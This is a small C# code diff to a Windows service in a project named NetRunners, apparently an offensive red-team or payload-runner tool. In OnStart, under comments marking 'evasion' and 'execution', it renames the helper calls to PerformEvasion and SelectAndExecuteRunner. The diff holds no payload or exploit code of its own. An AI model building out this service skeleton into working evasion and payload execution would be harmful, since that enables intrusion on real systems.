@@ -18,9 +18,9 @@ namespace NetRunners.Svc
         protected override void OnStart(string[] args)
         {
             // evasion
-            NetRunners.Helpers.Helper.PerformChecks();
+            NetRunners.Helpers.Helper.PerformEvasion();
             // execution
-            NetRunners.Helpers.Helper.SelectRunner();
+            NetRunners.Helpers.Helper.SelectAndExecuteRunner();
         }
         protected override void OnStop()
         {
